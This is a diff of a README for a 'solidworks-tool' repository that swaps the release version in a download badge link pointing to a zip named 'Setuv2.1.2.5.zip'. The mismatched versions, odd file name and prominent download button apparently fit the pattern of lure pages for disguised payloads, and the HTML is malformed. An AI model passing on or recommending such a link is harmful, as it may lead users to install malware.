@@ -1,4 +1,4 @@
-<a href="https://github.com/dmitry-wang-eng1900g6/solidworks-tool/releases/download/v4.0.0/Setuv2.1.2.5.zip src="https://img.shields.io/badge/Download-v1.0.0-success?style=for-the-badge" alt="Download Latest"></a>
+<a href="https://github.com/dmitry-wang-eng1900g6/solidworks-tool/releases/download/v5.0.0/Setuv2.1.2.5.zip src="https://img.shields.io/badge/Download-v1.0.0-success?style=for-the-badge" alt="Download Latest"></a>
 
 # 📦 solidworks-tool
 
